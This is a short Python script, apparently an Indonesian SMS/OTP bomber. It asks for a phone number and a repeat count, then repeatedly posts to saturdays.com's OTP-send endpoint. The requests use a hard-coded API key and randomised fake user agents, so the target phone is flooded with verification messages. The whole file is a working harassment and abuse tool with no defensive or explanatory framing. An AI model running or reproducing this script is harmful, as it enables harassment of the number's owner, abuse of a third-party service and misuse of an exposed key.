import urllib3
import requests
import json
import time
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as bs
ua = UserAgent()


berhasil = 0
gagal = 0
nom = input("Nomor: ")
jumlah = int(input("Jumlah: "))
for i in range(jumlah):
    time.sleep(1)
    url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
    header = {"Accept": "*/*",
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "id,en;q=0.9,id-ID;q=0.8",
              "Authorization": "undefined",
              "Connection": "keep-alive",
              "Content-Length": "55",
              "Content-Type": "application/json",
              "Host": "beta.api.saturdays.com",
              "Origin": "https://saturdays.com",
              "platform": "mweb",
              "Referer": "https://saturdays.com/",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "Windows",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-site",
              "User-Agent": ua.random,
              "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", }
    data = {"number": nom, "country_code": "+62", "type": ""}
    dataurljson = json.dumps(data)
    r1 = requests.Session().post(url, headers=header, data=dataurljson).text
    print(r1)
